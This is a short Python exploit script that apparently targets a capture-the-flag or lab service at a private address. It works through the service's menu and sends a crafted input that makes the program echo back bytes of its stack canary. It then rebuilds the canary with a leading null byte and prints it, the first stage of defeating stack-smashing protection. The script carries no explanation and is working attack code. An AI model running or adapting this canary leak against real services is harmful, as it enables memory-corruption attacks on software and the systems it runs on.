from tio import *

f=tio("192.168.2.107", 8888)

print f.read_until("Give up")
f.send("4\n")
f.read_until(") ")
f.send("y234567890\n")
token = f.read_until_re(r"y234567890\n(...)").group(1)
token = "\x00" + token
f.close()
print "Got canary:", token.encode("hex")
